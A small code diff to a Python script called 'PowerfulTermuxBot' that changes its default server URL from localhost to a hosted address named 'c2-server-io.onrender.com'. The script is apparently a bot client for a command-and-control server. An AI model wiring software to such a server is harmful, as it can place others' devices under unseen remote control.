@@ -253,7 +253,7 @@ class PowerfulTermuxBot:
         url = input("\n\033[1;36m>>>\033[0m ").strip()
         
         if not url:
-            url = "http://localhost:5000"
+            url = "https://c2-server-io.onrender.com"
         
         return url.rstrip('/')
     
@@ -837,4 +837,5 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"\n[\033[1;31m!\033[0m] Fatal error: {e}")
         sys.exit(1)
+
 
